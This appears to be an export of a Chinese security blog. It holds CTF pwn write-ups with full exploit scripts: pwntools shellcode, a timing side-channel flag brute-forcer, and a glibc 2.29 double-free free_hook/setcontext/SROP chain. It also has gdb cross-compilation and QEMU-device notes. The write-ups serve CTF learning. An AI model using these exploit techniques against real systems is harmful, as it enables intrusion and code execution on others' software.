<li><p><strong>建立RPC机制</strong>，客户端进程向FS进程发送请求，FS进程真正执行文件操作。客户端进程的实现在lib/file.c，lib/fd.c中。客户端进程和FS进程交互可总结为下图</p>
<p><img src="https://pic.imgdb.cn/item/616bf3432ab3f51d91a32334.png" alt></p>
</li>
</ol>
</li>
<li><p>支持从磁盘加载程序并运行。实现spawn()，该函数创建一个新的进程，并从磁盘加载程序运行，类似UNIX中的fork()后执行exec()。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>6.828</tag>
      </tags>
  </entry>
  <entry>
    <title>能源赛 wp</title>
    <url>/year/10/16/cl7iordqx006o293f7bfr5g3o/</url>
    <content><![CDATA[<p>主要是看到的shellcode的骚操作</p>
<a id="more"></a>

<h2 id="easyHtpp"><a href="#easyHtpp" class="headerlink" title="easyHtpp"></a>easyHtpp</h2><p>题⽬是⼀道简单http服务器，经过检查POST参数是/tryShellcode之后会执⾏shellcode，构造 body⻓度和我们shellcode⻓度相同后再绕过沙盒保护对system的限制即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#sh = process('./easyHttp')</span></span><br><span class="line">sh = remote(<span class="string">'106.14.120.231'</span>,<span class="number">29792</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeHeader</span><span class="params">(shellcode)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"POST /tryShellcode HTTP/1.0\r\nContent-Length: "</span> + str(len(shell</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"POST /login HTTP/1.0\r\nNAME: 1\nPass: 1\r\n\r\n"</span></span><br><span class="line"><span class="comment"># gdb.attach(sh,'b* $rebase(0x1F0F)')</span></span><br><span class="line">sh.recvuntil(<span class="string">'test&gt; \n'</span>)</span><br><span class="line">sh.sendline(Login())</span><br><span class="line">sh.recvuntil(<span class="string">'test&gt; \n'</span>)</span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">"flag"</span>, fd=<span class="number">1</span>))</span><br><span class="line">payload = makeHeader(shellcode)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这个题比较有意思的就是shellcraf.cat的那个操作，没有使用read系统调用，可以说是另一种orw,从汇编里可以看到采用了sendfile这个系统调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print shellcraft.cat(&quot;flag&quot;)</span><br><span class="line">    /* push &apos;flag\x00&apos; */</span><br><span class="line">    push 1</span><br><span class="line">    dec byte ptr [esp]</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    /* open(file=&apos;esp&apos;, oflag=&apos;O_RDONLY&apos;, mode=0) */</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call open() */</span><br><span class="line">    push SYS_open /* 5 */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line">    /* sendfile(out_fd=1, in_fd=&apos;eax&apos;, offset=0, count=0x7fffffff) */</span><br><span class="line">    push 1</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, eax</span><br><span class="line">    xor edx, edx</span><br><span class="line">    push 0x7fffffff</span><br><span class="line">    pop esi</span><br><span class="line">    /* call sendfile() */</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0xbb</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>

<h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>基本同2020年天翼杯safebox原题，2021年蓝帽杯线下原题，找到⽹上wp修改⼀些关键部分地 址，采⽤侧信道⽅式爆破flag即可。网上模版还是用的不顺手，还是记一下自己的模板吧。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">EXCV = context.binary = <span class="string">'./chall'</span></span><br><span class="line">e = ELF(EXCV)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p, index, ch)</span>:</span></span><br><span class="line">    shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    xor rdi, rdi;</span></span><br><span class="line"><span class="string">    push 0x10100;</span></span><br><span class="line"><span class="string">    pop rsi;</span></span><br><span class="line"><span class="string">    push 0x100;</span></span><br><span class="line"><span class="string">    pop rdx;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">    jmp rsi;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Are you a shellcode master?\n'</span>)</span><br><span class="line">    p.send(asm(shellcode).ljust(<span class="number">0x18</span>,<span class="string">b'a'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open</span></span><br><span class="line">    shellcode = <span class="string">"mov rax, 0x67616c662f2e; push rax; mov rdi,rsp;"</span></span><br><span class="line">    shellcode += <span class="string">"xor esi, esi; xor rdx, rdx;"</span></span><br><span class="line">    shellcode += <span class="string">"push 2; pop rax; syscall;"</span></span><br><span class="line">    <span class="comment"># shellcode = "push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># re open, rax =&gt; 4</span></span><br><span class="line">    shellcode += <span class="string">"push 2; pop rax; syscall;"</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># read(rax, 0x10040, 0x50)</span></span><br><span class="line">    shellcode += <span class="string">"mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># cmp and jz</span></span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">        shellcode += <span class="string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span>.format(index, ch)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span>.format(index, ch)</span><br><span class="line"> </span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"> </span><br><span class="line">    p.send(shellcode.ljust(<span class="number">0x100</span><span class="number">-14</span>, <span class="string">b'a'</span>) + <span class="string">b'/home/pwn/flag'</span>)</span><br><span class="line"> </span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> args.R:</span><br><span class="line">            p = remote(<span class="string">'106.14.120.231'</span>,<span class="number">28444</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(EXCV)</span><br><span class="line">        pwn(p, index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.5</span>:</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">""</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(EXCV)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pwn(p,0, 0x20)</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>长城杯writeup</title>
    <url>/year/10/14/cl7iordqw006k293fob3xutnx/</url>
    <content><![CDATA[<p>当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板</p>
<a id="more"></a>

<h2 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h2><p>libc2.29 具有doble free的漏洞，具有add，show，edit，delete的功能，但只能申请0x60大小以下的堆块，并且需要orw</p>
<h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ul>
<li>泄漏堆地址后，修改一个chunk的size大于0x440,free掉后从而泄漏libc地址</li>
<li>在堆上布置好shellcode，frame内容后把 free_hook更改为2.29特殊的gadget，然后free掉一个堆快来设置rdi和rdx</li>
</ul>
<h2 id="0x03-小trick"><a href="#0x03-小trick" class="headerlink" title="0x03 小trick"></a>0x03 小trick</h2><p>搜索2.29 从rdi转到rdx的gadget</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">ropper -f ./libc-2.29.so --search 'mov rdx'|grep "rdi + 8"</span><br></pre></td></tr></table></figure>

<h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process('./pwn')</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line">#sh = remote('47.104.175.110',20066)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.arch = 'amd64'</span><br><span class="line">context.os = 'linux'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="function">def <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil("&gt;&gt; \n")</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('input size:\n')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">move</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('context:\n')</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line">    sh.recvuntil('\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">1</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">heap_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x9f0</span></span><br><span class="line">log.success('heap_base: ' + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">0</span>, p64(heap_base + <span class="number">0x1210</span><span class="number">-0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span><span class="number">-0x50</span>+<span class="number">0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="meta"># add(1,0x40)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">libc_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">IO_file_jumps = <span class="number">0x1e6560</span> + libc_base</span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x1e6620</span></span><br><span class="line">binsh_addr = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">stdout_file = libc_base + <span class="number">0x1e5680</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line">mov rax,<span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rsi,<span class="number">0</span></span><br><span class="line">mov rdx,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">2</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,<span class="number">1024</span></span><br><span class="line">mov rax,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">1</span></span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,rax</span><br><span class="line">mov rax,<span class="number">1</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">60</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x2500</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym['mprotect'] + libc_base</span><br><span class="line"></span><br><span class="line">payload = str(frame)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(str(frame)), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2000</span> + i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">shellcode =p64(heap_base + <span class="number">0x2500</span> + <span class="number">8</span>) + <span class="keyword">asm</span>(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(shellcode), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2500</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, shellcode[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">gadget = <span class="number">0x12be97</span> + libc_base</span><br><span class="line"></span><br><span class="line">set_contextaddr = libc_base + libc.sym['setcontext']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x3000</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_contextaddr+<span class="number">53</span>) + p64(heap_base + <span class="number">0x2000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><a href="https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/" target="_blank" rel="noopener">https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/</a></p>
<p><a href="https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more">https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more</a></p>
<p><a href="https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/" target="_blank" rel="noopener">https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/</a></p>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>pwn writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb交叉编译</title>
    <url>/year/10/13/cl7iordq7004j293fkakzd8gy/</url>
    <content><![CDATA[<p>最近在编译gdb和交叉编译gdb的时候学习到的一些东西</p>
<a id="more"></a>

<p><img src="https://pic.imgdb.cn/item/616be95f2ab3f51d919a3e7d.png" alt></p>
<p><img src="https://pic.imgdb.cn/item/616be9902ab3f51d919a6a09.png" alt></p>
<h2 id="0x01-configure、-make、-make-install-背后的原理"><a href="#0x01-configure、-make、-make-install-背后的原理" class="headerlink" title="0x01 configure、 make、 make install 背后的原理"></a>0x01 configure、 make、 make install 背后的原理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>接下来让我们深入 Unix 去搞清楚这几行命令的作用。</p>
<h3 id="做了什么"><a href="#做了什么" class="headerlink" title="做了什么"></a>做了什么</h3><p>整个过程分为三步：</p>
<ol>
<li>配置</li>
</ol>
<p><code>configure</code> 脚本负责在你使用的系统上准备好软件的构建环境。确保接下来的构建和安装过程所需要的依赖准备好，并且搞清楚使用这些依赖需要的东西。</p>
<p>Unix 程序一般是用 C 语言写的，所以我们通常需要一个 C 编译器去构建它们。在这个例子中 <code>configure</code> 要做的就是确保系统中有 C 编译器，并确定它的名字和路径。</p>
<ol>
<li>构建</li>
</ol>
<p>当 <code>configure</code> 配置完毕后，可以使用 <code>make</code> 命令执行构建。这个过程会执行在 <code>Makefile</code> 文件中定义的一系列任务将软件源代码编译成可执行文件。</p>
<p>你下载的源码包一般没有一个最终的 <code>Makefile</code> 文件，一般是一个模版文件 <code>Makefile.in</code> 文件，然后 <code>configure</code> 根据系统的参数生成一个定制化的 <code>Makefile</code> 文件。</p>
<ol>
<li>安装</li>
</ol>
<p>现在软件已经被构建好并且可以执行，接下来要做的就是将可执行文件复制到最终的路径。<code>make install</code> 命令就是将可执行文件、第三方依赖包和文档复制到正确的路径。</p>
<p>这通常意味着，可执行文件被复制到某个 <code>PATH</code> 包含的路径，程序的调用文档被复制到某个 <code>MANPATH</code> 包含的路径，还有程序依赖的文件也会被存放在合适的路径。</p>
<p>因为安装这一步也是被定义在 <code>Makefile</code> 中，所以程序安装的路径可以通过 <code>configure</code> 命令的参数指定，或者 <code>configure</code> 通过系统参数决定。</p>
<p>如果要将可执行文件安装在系统路径，执行这步需要赋予相应的权限，一般是通过 sudo。</p>
<p><strong>安装过程简单说就是 configure 脚本根据系统信息将 <a href="http://makefile.in/" target="_blank" rel="noopener">Makefile.in</a> 模版文件转换为 Makefile文件</strong></p>
<h3 id="1-1-build-–host-–target"><a href="#1-1-build-–host-–target" class="headerlink" title="1.1 -build –host –target"></a>1.1 -build –host –target</h3><p>源码经过编译生成可执行程序。根据执行编译操作的平台、可执行程序的运行平台、可执行的程序的处理平台，可以将编译操作分为多种类型，对应的三个配置参数如下：</p>
<ul>
<li><strong>–build</strong>：运行编译工具链的平台，也就是正在执行编译操作的平台。如果未指定此参数，则通过 config.guess 猜测得到。通常都不指定此参数。</li>
<li><strong>-host</strong>：可执行程序将运行的平台。如果未指定此参数，则和 –build 相同<code>。如果 --host 和 --build 不同，是交叉编译；否则是普通编译。</code></li>
<li><strong>-target</strong>：<code>可执行程序将处理的平台。</code>如果未指定此参数，则和 –host 相同。一般来说，程序运行在什么平台，处理的就是什么平台，此参数值和 –host 参数相同，不需显式指定，所以通常不会关注到此参数。但在制作交叉编译工具 (如 gcc、gdb 等) 这种特殊情况下，此值和 –host 不同，例如交叉编译器 arm-linux-gcc，它运行在 x86-linux 平台 (–host 参数)，但处理的是 arm-linux 平台 (–target 参数)。如果是交叉编译一个普通的应用，如运行于 arm-linux 平台的 tftp 程序，则它的运行平台和处理平台都是 arm-linux 平台。</li>
</ul>
<h3 id="1-2交叉编译gdb-mips-架构"><a href="#1-2交叉编译gdb-mips-架构" class="headerlink" title="1.2交叉编译gdb(mips 架构)"></a>1.2交叉编译gdb(mips 架构)</h3><p>如果是交叉编译gdb，只设置host参数就可以了。target默认会和host参数相同。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./configure --host=mipsel-openwrt-linux CC=mipsel-linux-gnu-gcc CXX=mipsel-linux-gnu-g++ CFLAGS=-static</span><br></pre></td></tr></table></figure>

<h3 id="1-3-64位环境下编译32位gdb"><a href="#1-3-64位环境下编译32位gdb" class="headerlink" title="1.3 64位环境下编译32位gdb"></a>1.3 64位环境下编译32位gdb</h3><p>需要依赖libdeflate库，因此先将libdflate库安装到指定文件夹下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make CFLAGS=<span class="string">"-m32"</span></span><br><span class="line">sudo make install DESTDIR=/home/giantbranch/IOT/Tfuzz/<span class="built_in">test</span>/i386 CFLAGS=<span class="string">"-m32"</span></span><br></pre></td></tr></table></figure>

<p>然后编译gdb</p>
<ul>
<li>clean清除</li>
<li>消除掉原来的cache</li>
<li>重新设置config</li>
<li>在make时指定我们编译libdelate库的位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure --target=i386-linux  CFLAGS=<span class="string">"-static -m32"</span></span><br><span class="line">make  LDFLAGS+=<span class="string">"-L /home/giantbranch/IOT/Tfuzz/test/i386/usr/local/lib"</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-正常编译64位gdb"><a href="#1-4-正常编译64位gdb" class="headerlink" title="1.4 正常编译64位gdb"></a>1.4 正常编译64位gdb</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make clean</span><br><span class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure CFLAGS=<span class="string">"-static"</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="1-5-查看交叉编译链适配环境"><a href="#1-5-查看交叉编译链适配环境" class="headerlink" title="1.5 查看交叉编译链适配环境"></a>1.5 查看交叉编译链适配环境</h3><p><img src="https://pic.imgdb.cn/item/616be9c62ab3f51d919a9bb3.png" alt></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://thoughtbot.com/blog/the-magic-behind-configure-make-make-install" target="_blank" rel="noopener">The magic behind configure, make, make install (thoughtbot.com)</a></p>
<p><a href="https://seisman.github.io/how-to-write-makefile/introduction.html" target="_blank" rel="noopener">makefile介绍 — 跟我一起写Makefile 1.0 文档 (seisman.github.io)</a></p>
<p><a href="https://sourceware.org/gdb/wiki/BuildingCrossGDBandGDBserver" target="_blank" rel="noopener">BuildingCrossGDBandGDBserver - GDB Wiki (sourceware.org)</a></p>
<p><a href="https://tsaiyuyan.github.io/2019/05/17/ubuntu-jian-li-gdb-cross-complier-kai-fa-huan-jing/#toc-heading-1" target="_blank" rel="noopener">Ubuntu 建立 gdb cross-complier 開發環境 | YuYan’s blog (tsaiyuyan.github.io)</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/" target="_blank" rel="noopener">IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
]]></content>
      <tags>
        <tag>gdb 工具</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu初探</title>
    <url>/year/03/07/cl7iordq0003v293fwbdjxa27/</url>
    <content><![CDATA[<p>qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。</p>
<p>所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。</p>
<a id="more"></a>

<h2 id="0x01-qemu基础"><a href="#0x01-qemu基础" class="headerlink" title="0x01 qemu基础"></a>0x01 qemu基础</h2><p>主要参考这篇博客吧<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p>
<p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p>
<h3 id="1-1-查看pci设备"><a href="#1-1-查看pci设备" class="headerlink" title="1.1 查看pci设备"></a>1.1 查看pci设备</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure>

<p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p>
